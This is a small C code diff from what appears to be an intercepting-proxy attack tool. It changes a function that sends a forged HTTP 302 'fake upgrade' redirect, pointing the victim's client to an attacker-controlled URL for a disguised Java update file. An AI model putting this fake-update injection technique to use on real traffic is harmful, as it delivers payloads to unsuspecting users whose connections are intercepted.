@@ -37,10 +37,10 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *hos
    DEBUG_MSG(D_INFO, "Tag: %s, sending fake upgrade redirect [%s/%s] ", tag, file, "java-map-update.xml");
 
    snprintf(header, HTTP_HEADER_LEN, "HTTP/1.0 302 Found\r\n"
-      "Location: %s/%s\r\n"
+      "Location: %s/java-map-update-%s.xml\r\n"
       "Content-Type: text/html\r\n"
       "Connection: close\r\n"
-      "\r\n", ipa_url, "java-map-update.xml");
+      "\r\n", ipa_url, file);
 
    BIO_write(*cbio, header, strlen(header));
 
